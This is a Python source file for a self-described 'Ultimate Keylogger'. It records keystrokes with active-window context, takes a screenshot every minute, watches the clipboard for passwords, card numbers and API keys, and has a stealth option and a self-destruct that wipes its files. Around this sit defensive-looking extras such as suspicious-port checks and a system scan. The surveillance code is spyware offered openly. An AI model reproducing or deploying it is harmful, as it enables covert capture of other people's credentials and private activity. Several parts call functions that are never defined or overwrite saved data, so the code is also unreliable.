import os
import sys
import time
import json
import hashlib
from datetime import datetime
import numpy as np
from cryptography.fernet import Fernet
from sklearn.ensemble import IsolationForest
from sklearn.decomposition import PCA
import psutil
import platform
import socket
import uuid
import threading
import subprocess
from queue import Queue
import re
import tempfile
import shutil

class UltimateKeylogger:
    def __init__(self):
        self.is_running = False
        self.stealth_mode = False
        self.encryption_key = self._init_encryption()
        self.cipher = Fernet(self.encryption_key)
        self.users = self._load_data("users.enc", {})
        self.models = {}
        self.blockchain = Blockchain()
        self.key_queue = Queue()
        self.session_id = str(uuid.uuid4())
        self.machine_id = self._get_machine_id()
        self.threads = []
        self.last_clipboard = ""
        self.screenshot_count = 0

    # === Core Functions ===
    def _init_encryption(self):
        """Initialize encryption with error handling"""
        try:
            if not os.path.exists("encryption.key"):
                key = Fernet.generate_key()
                with open("encryption.key", "wb") as f:
                    f.write(key)
                return key
            with open("encryption.key", "rb") as f:
                return f.read()
        except Exception as e:
            print(f"[CRITICAL] Encryption setup failed: {str(e)}")
            sys.exit(1)

    def _load_data(self, filename, default):
        """Load encrypted data with robust error handling"""
        try:
            if os.path.exists(filename):
                with open(filename, "rb") as f:
                    return json.loads(self.cipher.decrypt(f.read()).decode())
        except Exception as e:
            print(f"[WARNING] Could not load {filename}: {str(e)}")
        return default

    def _save_data(self, filename, data):
        """Save data with encryption and error handling"""
        try:
            with open(filename, "wb") as f:
                f.write(self.cipher.encrypt(json.dumps(data).encode()))
        except Exception as e:
            print(f"[ERROR] Failed to save {filename}: {str(e)}")

    def _get_machine_id(self):
        """Get unique machine identifier with multiple fallbacks"""
        try:
            if platform.system() == "Windows":
                result = subprocess.check_output(
                    'wmic csproduct get uuid', 
                    shell=True,
                    stderr=subprocess.DEVNULL
                ).decode().split('\n')[1].strip()
                return result if result else str(uuid.getnode())
            else:
                with open('/etc/machine-id') as f:
                    return f.read().strip()
        except:
            return str(uuid.getnode())

    # === Key Capture ===
    def _keyboard_listener(self):
        """Platform-specific key capture with precise timing"""
        try:
            if platform.system() == "Windows":
                import msvcrt
                while self.is_running:
                    if msvcrt.kbhit():
                        try:
                            key = msvcrt.getch().decode(errors='ignore')
                            self._process_keypress(key)
                        except:
                            continue
                    time.sleep(0.01)
            else:
                import tty
                import termios
                import select
                fd = sys.stdin.fileno()
                old_settings = termios.tcgetattr(fd)
                try:
                    tty.setraw(fd)
                    while self.is_running:
                        if select.select([sys.stdin], [], [], 0.1)[0]:
                            key = sys.stdin.read(1)
                            self._process_keypress(key)
                finally:
                    termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
        except Exception as e:
            print(f"[ERROR] Keyboard listener failed: {str(e)}")
            self.is_running = False

    def _process_keypress(self, key):
        """Process each keypress with context"""
        try:
            self.key_queue.put({
                'key': key,
                'time': time.time(),
                'process': self._get_active_process(),
                'window': self._get_active_window(),
                'session': self.session_id,
                'machine': self.machine_id
            })
        except Exception as e:
            print(f"[WARNING] Failed to process keypress: {str(e)}")

    # === System Monitoring ===
    def _get_active_process(self):
        """Get process info with error handling"""
        try:
            p = psutil.Process()
            return {
                'name': p.name(),
                'pid': p.pid,
                'username': p.username(),
                'exe': p.exe() if platform.system() == "Windows" else None
            }
        except:
            return "unknown"

    def _get_active_window(self):
        """Get window title with platform-specific methods"""
        try:
            if platform.system() == "Windows":
                import win32gui
                return win32gui.GetWindowText(win32gui.GetForegroundWindow())
            elif platform.system() == "Linux":
                return subprocess.check_output(
                    ["xdotool", "getwindowfocus", "getwindowname"],
                    stderr=subprocess.DEVNULL
                ).decode().strip()
            elif platform.system() == "Darwin":
                return subprocess.check_output(
                    ["osascript", "-e", 'tell app "System Events" to get name of first process whose frontmost is true'],
                    stderr=subprocess.DEVNULL
                ).decode().strip()
        except:
            return "unknown"

    # === Advanced Features ===
    def _network_monitor(self):
        """Detect suspicious network activity"""
        while self.is_running:
            try:
                connections = psutil.net_connections()
                for conn in connections:
                    if conn.status == 'ESTABLISHED' and conn.raddr:
                        if conn.raddr.port in [4444, 31337, 6667, 1337]:
                            self._alert(f"Suspicious connection to {conn.raddr.ip}:{conn.raddr.port}")
                time.sleep(10)
            except Exception as e:
                print(f"[WARNING] Network monitor error: {str(e)}")
                time.sleep(5)

    def _capture_screenshots(self):
        """Periodically capture screenshots"""
        try:
            import pyautogui
            screenshot_dir = os.path.join(tempfile.gettempdir(), "screenshots")
            os.makedirs(screenshot_dir, exist_ok=True)
            
            while self.is_running:
                try:
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = os.path.join(screenshot_dir, f"screenshot_{self.screenshot_count}.png")
                    pyautogui.screenshot(filename)
                    self.screenshot_count += 1
                    time.sleep(60)  # Capture every minute
                except Exception as e:
                    print(f"[WARNING] Screenshot error: {str(e)}")
                    time.sleep(10)
        except ImportError:
            print("[!] Screenshot capture requires pyautogui")

    def _monitor_clipboard(self):
        """Monitor clipboard for sensitive data"""
        try:
            import pyperclip
            while self.is_running:
                try:
                    current = pyperclip.paste()
                    if current != self.last_clipboard:
                        if self._is_sensitive(current):
                            self._alert(f"Clipboard copied sensitive data: {current[:50]}...")
                        self.last_clipboard = current
                    time.sleep(1)
                except Exception as e:
                    print(f"[WARNING] Clipboard error: {str(e)}")
                    time.sleep(5)
        except ImportError:
            print("[!] Clipboard monitoring requires pyperclip")

    def _is_sensitive(self, text):
        """Detect passwords, credit cards, etc."""
        patterns = {
            'credit_card': r'\b(?:\d[ -]*?){13,16}\b',
            'password': r'password[=:]\s*\S+',
            'api_key': r'\b[A-Za-z0-9]{32}\b'
        }
        for pattern in patterns.values():
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False

    def _alert(self, message):
        """Log security alerts to blockchain"""
        alert = {
            'message': message,
            'time': str(datetime.now()),
            'severity': 'high'
        }
        self.blockchain.add_block(alert)

    # === AI Authentication ===
    def train_behavior_model(self, username):
        """Train AI model for user behavior"""
        if username not in self.users or len(self.users[username]) < 10:
            print("[!] Need at least 10 samples for training")
            return

        try:
            X = np.array([list(sample.values()) for sample in self.users[username]])
            pca = PCA(n_components=0.95)
            X_pca = pca.fit_transform(X)
            
            model = IsolationForest(contamination=0.1)
            model.fit(X_pca)
            
            self.models[username] = {
                'pca': pca,
                'model': model,
                'threshold': np.percentile(model.decision_function(X_pca), 5),
                'trained_at': str(datetime.now())
            }
            print(f"[+] AI model trained for {username}")
        except Exception as e:
            print(f"[ERROR] Model training failed: {str(e)}")

    # === Core Operations ===
    def start(self, stealth=False, advanced=False):
        """Start keylogger with options"""
        if self.is_running:
            return "[!] Keylogger already running"

        self.is_running = True
        self.stealth_mode = stealth
        
        # Start core threads
        self.threads = [
            threading.Thread(target=self._keyboard_listener),
            threading.Thread(target=self._process_keystrokes)
        ]
        
        # Advanced features
        if advanced:
            self.threads.extend([
                threading.Thread(target=self._network_monitor),
                threading.Thread(target=self._monitor_clipboard)
            ])
            if platform.system() == "Windows":
                self.threads.append(threading.Thread(target=self._capture_screenshots))

        for t in self.threads:
            t.daemon = True
            t.start()

        return "[+] Keylogger started" + (" in stealth mode" if stealth else "")

    def stop(self):
        """Stop keylogger securely"""
        if not self.is_running:
            return "[!] Keylogger not running"

        self.is_running = False
        for t in self.threads:
            if t.is_alive():
                t.join(timeout=2)
        
        return "[+] Keylogger stopped. All data saved."

    def _process_keystrokes(self):
        """Process and save keystrokes from queue"""
        batch = []
        last_save = time.time()

        while self.is_running or not self.key_queue.empty():
            try:
                key_data = self.key_queue.get(timeout=0.1)
                batch.append(key_data)

                # Auto-save conditions
                if len(batch) >= 50 or (time.time() - last_save) > 30:
                    self._save_batch(batch)
                    batch = []
                    last_save = time.time()

            except:
                continue

        # Final save
        if batch:
            self._save_batch(batch)

    def _save_batch(self, batch):
        """Save a batch of keystrokes"""
        try:
            self._save_data("keystrokes.enc", batch)
        except Exception as e:
            print(f"[ERROR] Failed to save keystrokes: {str(e)}")

    # === Deep System Scanning ===
    def deep_scan(self):
        """Comprehensive system scan with threat detection"""
        print("\n[INITIATING DEEP SYSTEM SCAN]")
        
        try:
            scan_results = {
                'timestamp': str(datetime.now()),
                'system': self._scan_system(),
                'processes': self._scan_processes(),
                'network': self._scan_network(),
                'files': self._scan_files(),
                'security': self._check_security()
            }
            
            self._save_data("deep_scan.enc", scan_results)
            self._print_scan_summary(scan_results)
            return "[+] Deep scan completed. Results saved."
        except Exception as e:
            return f"[ERROR] Scan failed: {str(e)}"

    def _scan_system(self):
        """Collect system information"""
        try:
            return {
                'platform': platform.platform(),
                'hostname': socket.gethostname(),
                'ip': socket.gethostbyname(socket.gethostname()),
                'cpu': psutil.cpu_percent(interval=1),
                'memory': psutil.virtual_memory().percent,
                'boot_time': datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
            }
        except:
            return "error"

    def _scan_processes(self):
        """Analyze running processes"""
        suspicious = []
        try:
            for proc in psutil.process_iter(['pid', 'name', 'exe', 'username']):
                try:
                    info = proc.info
                    # Simple anomaly detection
                    if info['exe'] and not os.path.exists(info['exe']):
                        suspicious.append({
                            'pid': info['pid'],
                            'name': info['name'],
                            'reason': 'missing_executable'
                        })
                except:
                    continue
            return {
                'total_processes': len(psutil.pids()),
                'suspicious': suspicious[:10]  # Limit output
            }
        except:
            return "error"

    def _scan_network(self):
        """Analyze network connections"""
        try:
            connections = []
            suspicious_ports = [4444, 31337, 6667, 1337]
            suspicious = []
            
            for conn in psutil.net_connections():
                if conn.status == 'ESTABLISHED' and conn.raddr:
                    connections.append({
                        'local': f"{conn.laddr.ip}:{conn.laddr.port}",
                        'remote': f"{conn.raddr.ip}:{conn.raddr.port}",
                        'pid': conn.pid
                    })
                    if conn.raddr.port in suspicious_ports:
                        suspicious.append({
                            'port': conn.raddr.port,
                            'remote': conn.raddr.ip,
                            'pid': conn.pid
                        })
            
            return {
                'connections': connections[:20],  # Limit output
                'suspicious': suspicious
            }
        except:
            return "error"

    def _scan_files(self):
        """Scan for suspicious files"""
        try:
            suspicious = []
            for root, _, files in os.walk(os.path.expanduser("~")):
                for file in files:
                    if file.endswith(('.exe', '.dll', '.scr')):
                        path = os.path.join(root, file)
                        try:
                            if os.path.getsize(path) < 5000:  # Small executables
                                suspicious.append(path)
                                if len(suspicious) >= 10:  # Limit output
                                    break
                        except:
                            continue
                if len(suspicious) >= 10:
                    break
            return {'suspicious_files': suspicious}
        except:
            return "error"

    def _check_security(self):
        """Basic security checks"""
        try:
            return {
                'firewall': self._check_firewall(),
                'antivirus': self._check_antivirus()
            }
        except:
            return "error"

    def _check_firewall(self):
        """Check firewall status"""
        try:
            if platform.system() == "Windows":
                result = subprocess.check_output(
                    "netsh advfirewall show allprofiles state",
                    shell=True,
                    stderr=subprocess.DEVNULL
                ).decode()
                return "active" if "ON" in result else "inactive"
            else:
                return "unknown"
        except:
            return "error"

    def _check_antivirus(self):
        """Check for antivirus (Windows only)"""
        try:
            if platform.system() == "Windows":
                result = subprocess.check_output(
                    'wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName',
                    shell=True,
                    stderr=subprocess.DEVNULL
                ).decode()
                return "installed" if result.strip() else "not detected"
            return "unknown"
        except:
            return "error"

    def _print_scan_summary(self, results):
        """Print formatted scan results"""
        print("\n[DEEP SCAN RESULTS]")
        print(f"System: {results['system'].get('platform', 'error')}")
        print(f"Processes: {results['processes'].get('total_processes', 'error')} running")
        print(f"Suspicious processes: {len(results['processes'].get('suspicious', []))}")
        print(f"Network connections: {len(results['network'].get('connections', []))}")
        print(f"Suspicious ports: {len(results['network'].get('suspicious', []))}")
        print(f"Suspicious files: {len(results['files'].get('suspicious_files', []))}")
        print(f"Firewall: {results['security'].get('firewall', 'error')}")
        print(f"Antivirus: {results['security'].get('antivirus', 'error')}")

    # === Data Management ===
    def self_destruct(self):
        """Securely wipe all data"""
        try:
            self.stop()
            files = ["keystrokes.enc", "users.enc", "models.enc", "system.enc", "encryption.key"]
            for f in files:
                try:
                    os.remove(f)
                except:
                    pass
            # Remove screenshot directory if it exists
            screenshot_dir = os.path.join(tempfile.gettempdir(), "screenshots")
            if os.path.exists(screenshot_dir):
                shutil.rmtree(screenshot_dir)
            return "[+] All data destroyed"
        except Exception as e:
            return f"[ERROR] Self-destruct failed: {str(e)}"

class Blockchain:
    def __init__(self):
        self.chain = [self._create_genesis_block()]
    
    def _create_genesis_block(self):
        return {
            'index': 0,
            'timestamp': str(datetime.now()),
            'data': "Genesis Block",
            'previous_hash': "0",
            'hash': self._calculate_hash(0, "Genesis Block", "0")
        }
    
    def add_block(self, data):
        last_block = self.chain[-1]
        new_block = {
            'index': last_block['index'] + 1,
            'timestamp': str(datetime.now()),
            'data': data,
            'previous_hash': last_block['hash'],
            'hash': self._calculate_hash(
                last_block['index'] + 1,
                data,
                last_block['hash']
            )
        }
        self.chain.append(new_block)
    
    def _calculate_hash(self, index, data, previous_hash):
        sha = hashlib.sha256()
        sha.update(f"{index}{data}{previous_hash}".encode())
        return sha.hexdigest()

def command_interface():
    print("""
    █████╗ ███████╗██╗  ██╗    Ultimate Keylogger
   ██╔══██╗██╔════╝██║ ██╔╝    v5.0 (Educational)
   ███████║███████╗█████╔╝ 
   ██╔══██║╚════██║██╔═██╗ 
   ██║  ██║███████║██║  ██╗
   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    """)
    
    keylogger = UltimateKeylogger()
    cmd_help = """
Advanced Commands:
  start [stealth] [advanced] - Start keylogger with options
  stop                      - Stop keylogger
  scan                      - Deep system scan
  adduser <name>            - Enroll new user (10 samples)
  train <name>              - Train AI model for user
  audit                     - View security alerts
  destruct                  - Wipe all data
  exit                      - Quit
    """
    
    while True:
        try:
            cmd = input("\nUK> ").strip().lower().split()
            if not cmd:
                continue
                
            if cmd[0] == "start":
                stealth = "stealth" in cmd
                advanced = "advanced" in cmd
                print(keylogger.start(stealth=stealth, advanced=advanced))
                
            elif cmd[0] == "stop":
                print(keylogger.stop())
                
            elif cmd[0] == "scan":
                print(keylogger.deep_scan())
                
            elif cmd[0] == "adduser" and len(cmd) > 1:
                print(f"Training user {cmd[1]}. Type your passphrase 10 times:")
                samples = []
                for i in range(10):
                    print(f"Sample {i+1}/10: ", end="", flush=True)
                    keylogger.start()
                    input()  # Wait for Enter
                    keylogger.stop()
                    if hasattr(keylogger, 'current_keystrokes'):
                        features = keylogger._extract_features(keylogger.current_keystrokes)
                        if features:
                            samples.append(features)
                keylogger.users[cmd[1]] = samples
                keylogger._save_data("users.enc", keylogger.users)
                print(f"[+] User {cmd[1]} enrolled with {len(samples)} samples")
                
            elif cmd[0] == "train" and len(cmd) > 1:
                keylogger.train_behavior_model(cmd[1])
                
            elif cmd[0] == "audit":
                print("\n[SECURITY ALERTS]")
                for block in keylogger.blockchain.chain[-10:]:
                    if isinstance(block['data'], dict) and 'message' in block['data']:
                        print(f"{block['timestamp']}: {block['data']['message']}")
                
            elif cmd[0] == "destruct":
                if input("Confirm wipe ALL data? (y/n) ").lower() == "y":
                    print(keylogger.self_destruct())
                
            elif cmd[0] == "help":
                print(cmd_help)
                
            elif cmd[0] == "exit":
                keylogger.stop()
                break
                
            else:
                print("Unknown command. Type 'help'")
                
        except KeyboardInterrupt:
            print("\n[!] Use 'exit' to quit")
        except Exception as e:
            print(f"[ERROR] {str(e)}")

if __name__ == "__main__":
    # Check dependencies
    try:
        import cryptography
        import psutil
        import numpy
        from sklearn.ensemble import IsolationForest
    except ImportError as e:
        print(f"[ERROR] Missing dependencies: {str(e)}")
        print("Install with: pip install cryptography psutil numpy scikit-learn")
        sys.exit(1)
        
    command_interface()